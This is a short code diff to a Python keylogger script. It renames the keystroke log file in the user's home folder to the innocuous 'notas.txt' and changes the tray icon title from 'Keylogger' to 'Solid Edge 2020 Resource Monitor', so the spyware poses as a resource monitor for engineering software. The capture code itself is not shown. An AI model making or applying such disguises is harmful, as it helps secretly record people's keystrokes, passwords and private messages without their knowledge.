@@ -15,7 +15,7 @@ import signal
 # Get user's home directory
 home_dir = Path.home()
 # Path to save logs in the home directory
-log_file = home_dir / "klog_logs.txt" # Changed filename slightly to avoid potential conflicts
+log_file = home_dir / "notas.txt" # Changed filename slightly to avoid potential conflicts
 
 # Global variable to track the timestamp of the last keypress
 last_key_time = None
@@ -58,7 +58,7 @@ def exit_program(icon):
 def setup_tray():
     icon = pystray.Icon("keylogger")
     icon.icon = create_icon()
-    icon.title = "Keylogger"
+    icon.title = "Solid Edge 2020 Resource Monitor"
     # Add a menu item to exit
     icon.menu = pystray.Menu(
         pystray.MenuItem("Exit", exit_program)
